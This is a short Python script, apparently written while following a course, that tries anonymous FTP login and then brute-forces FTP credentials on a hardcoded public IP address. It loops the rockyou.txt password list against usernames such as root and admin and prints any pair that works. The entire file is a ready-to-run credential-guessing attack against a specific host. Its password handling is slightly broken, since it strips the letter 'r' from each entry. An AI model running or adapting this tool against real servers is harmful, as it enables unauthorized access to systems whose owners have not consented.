# Thank you so much MR. GUS KHAWAJA for teaching me how to do this.

import ftplib

def connect(host, user, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user,password)
        ftp.quit()
        return True
    except:
        return False

def main(targetHostAddress):


    userNames = ['root', 'david', 'petname', 'admin']
    passwordsFilePath = 'rockyou.txt'

    #try to connect with anonymous credentials
    print('[+] Using anonymous credentials  for ' + targetHostAddress)
    if connect(targetHostAddress, 'anonymous', 'test@test.com'):
        print('[*] FTP Anonymous log on suceeded on host ' + targetHostAddress)
    else:
        print('[*] FTP Anonymous logs on failed on host ' + targetHostAddress)

        #Try brute force with list
        passwordsFile = open(passwordsFilePath, 'r', encoding="ISO-8859-1" )
        for line in passwordsFile.readlines():
        #for line in passwordsFile.read():
            password = line.strip('r').strip('\n')
            print("testing: " + str(password))
            for userName in userNames:
                if connect(targetHostAddress, userName, password):
                    print("[*] FTP Logon suceeded on host " + targetHostAddress + "Username " + userName + "password: " + password)
                    exit(0)
                else: print("[0] FTP Logon failed on host " + targetHostAddress)


if __name__ == "__main__":
    targetHostAddress = '83.60.115.185'
    main(targetHostAddress)
